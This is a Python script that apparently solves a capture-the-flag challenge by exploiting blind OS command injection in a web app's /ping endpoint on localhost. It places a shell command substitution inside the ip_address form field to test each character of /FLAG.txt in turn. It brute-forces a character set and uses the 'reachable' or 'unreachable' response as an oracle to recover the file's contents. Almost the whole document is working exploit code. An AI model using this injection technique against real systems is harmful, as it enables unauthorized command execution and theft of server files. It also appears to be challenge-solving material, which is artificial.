import requests
import string

base_url = "http://127.0.0.1:32943"
endpoint = "/ping"

headers = {"Content-Type": "application/x-www-form-urlencoded"}

def send_ping(payload):
    data = {"ip_address": payload}
    try:
        resp = requests.post(f"{base_url}{endpoint}", data=data, headers=headers, timeout=10)
        return resp.text
    except Exception as e:
        return f"ERROR: {e}"

def get_status(text):
    if "reachable" in text.lower() and "unreachable" not in text.lower():
        return "REACHABLE"
    elif "unreachable" in text.lower():
        return "UNREACHABLE"
    return "UNKNOWN"

print("COMPLETE FLAG EXTRACTION FROM /FLAG.txt")
print("=" * 70)

target_file = "/FLAG.txt"

# Optimized charset
charset = "FLAG{}_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-=+[]|;:',.<>/?"

flag = "FLAG{82f9"  # Already known from partial extraction

for pos in range(10, 80):  # Continue from position 10
    found = False
    for char in charset:
        payload = f"$(test $(cut -c{pos} {target_file}) = '{char}' && echo 127.0.0.1)"
        resp = send_ping(payload)
        if get_status(resp) == "REACHABLE":
            flag += char
            # Stop if we hit the end of flag format
            if char == "}":
                found = True
                print(f"Position {pos}: '{char}' -> COMPLETE FLAG FOUND!")
                break
            found = True
            break
    
    print(f"Position {pos}: {flag}")
    
    if not found:
        print(f"\nNo character found at position {pos} - stopping extraction")
        break
    
    # Stop if we have a complete flag
    if flag.endswith("}") and "FLAG{" in flag:
        break

print(f"\n{'='*70}")
print(f"[*] FINAL FLAG: {flag}")
print(f"{'='*70}")

